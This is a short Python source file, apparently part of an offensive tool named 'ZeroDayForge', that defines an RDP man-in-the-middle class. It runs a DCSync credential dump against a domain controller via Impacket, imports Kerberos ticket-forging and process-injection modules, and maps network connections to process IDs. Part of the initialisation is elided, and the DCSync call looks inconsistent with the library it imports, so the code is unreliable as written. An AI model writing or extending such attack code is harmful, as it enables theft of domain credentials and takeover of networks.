import logging
import socket
import psutil
from impacket.examples.secretsdump import DCSync
from pyrdp.parser import TCPParser
from core.kerberos_attack import KerberosForge
from payloads.process_inject import ProcessInjector

class RDPMitM:
	def __init__(self, listen_port=3389):
		self.logger = logging.getLogger('ZeroDayForge.RDP')
		self.logger.setLevel(logging.INFO)
		# ... rest of init ...

	def _dc_sync(self, ticket):
		"""Full DCSync using Impacket's implementation"""
		try:
			self.logger.info("Initiating DCSync attack")
			dumper = DCSync(
				ticket['domain'], 
				ticket['user'], 
				ticket['domain'],
				options={
					'dc-ip': ticket['dc_ip'],
					'aesKey': ticket['aes_key']
				}
			)
			dumper.dump()
		except Exception as e:
			self.logger.error(f"DCSync failed: {e}")
			raise

	def resolve_pid(self, target_ip):
		"""Find PID by network connections"""
		for proc in psutil.process_iter(['pid', 'name', 'connections']):
			for conn in proc.info['connections']:
				if conn.raddr.ip == target_ip:
					return proc.info['pid']
		return None